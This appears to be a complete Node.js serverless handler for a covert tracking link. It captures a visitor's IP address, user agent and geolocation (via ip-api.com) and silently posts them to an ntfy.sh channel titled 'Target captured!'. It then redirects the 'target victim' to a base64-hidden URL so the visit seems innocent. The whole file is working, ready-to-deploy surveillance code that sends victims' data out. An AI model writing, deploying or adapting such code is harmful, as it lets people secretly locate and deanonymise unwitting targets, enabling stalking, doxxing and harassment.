const axios = require('axios');

module.exports = async (req, res) => {
    const { topic, t } = req.query;

    let targetUrl = 'https://google.com';
    if (t) {
        try { targetUrl = Buffer.from(t, 'base64').toString('utf-8'); } catch (e) { }
    }

    if (!topic) {
        return res.redirect(301, targetUrl);
    }

    // Gather Target Data
    const ip = req.headers['x-forwarded-for'] || req.headers['x-real-ip'] || req.socket.remoteAddress || 'Unknown';
    const userAgent = req.headers['user-agent'] || 'Unknown';

    // Get Geo Location using ip-api.com
    let geo = {};
    try {
        const cleanIp = ip.split(',')[0].trim();
        const geoReq = await axios.get(`http://ip-api.com/json/${cleanIp}`);
        geo = geoReq.data;
    } catch (e) {
        // Silent fail
    }

    // Prepare JSON payload for the dashboard
    const trackerData = JSON.stringify({
        ip: ip,
        country: geo.country || 'Unknown',
        region: geo.regionName || 'Unknown',
        city: geo.city || 'Unknown',
        isp: geo.isp || geo.org || 'Unknown',
        lat: geo.lat || null,
        lon: geo.lon || null,
        ua: userAgent,
        time: new Date().toISOString()
    });

    // Push silently to Ntfy (Free open source pubsub)
    try {
        await axios.post(`https://ntfy.sh/${topic}`, trackerData, {
            headers: {
                'Title': 'Target Tertangkap!',
                'Tags': 'skull'
            }
        });
    } catch (err) {
        // silent
    }

    // End request and redirect the target victim
    return res.redirect(301, targetUrl);
};
